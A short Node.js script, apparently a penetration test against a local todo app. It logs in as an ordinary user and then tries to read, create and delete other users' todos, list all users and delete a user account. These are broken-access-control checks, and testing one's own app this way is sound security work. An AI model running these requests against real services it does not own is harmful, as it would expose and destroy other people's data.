const axios = require('axios');
const baseURL = 'http://localhost:5000'; // or whatever port you're running on

const attackerCredentials = {
  username: 'user1',
  password: 'user123'
};

async function runPenTest() {
  try {
    // Step 1: Login as regular user
    const loginRes = await axios.post(`${baseURL}/login`, attackerCredentials);
    const user = loginRes.data;
    console.log('[1] Logged in as:', user);

    // Step 2: Attempt to fetch another user's todos (shouldn't be allowed)
    const forgedUserId = 1; // attacker is NOT user 1
    const otherTodosRes = await axios.get(`${baseURL}/todos/${forgedUserId}`);
    console.log('[2] Retrieved another user\'s todos:');
    console.table(otherTodosRes.data)

    // Step 3: Create a todo for another user (e.g., user_id 1)
    const forgedTodo = await axios.post(`${baseURL}/todos`, {
      content: 'Injected task into another user',
      user_id: 1 // attacker should not be able to do this
    });
    console.log('[3] Created forged todo:', forgedTodo.data);

    // Step 4: Delete another user’s todo (e.g., ID 1)
    const deleteTodoRes = await axios.delete(`${baseURL}/todos/1`);
    console.log('[4] Deleted todo with ID 1:', deleteTodoRes.data);

    // Step 5: View all users
    const usersRes = await axios.get(`${baseURL}/users`);
    console.log('[5] Retrieved user list:');
    console.table(usersRes.data);

    // Step 6: Delete a user (e.g., user ID 2)
    const deleteUserRes = await axios.delete(`${baseURL}/delete-user/2`);
    console.log('[6] Deleted user with ID 2:', deleteUserRes.data);

  } catch (err) {
    console.error('Pen test failed:', err.response?.data || err.message);
  }
}

runPenTest();
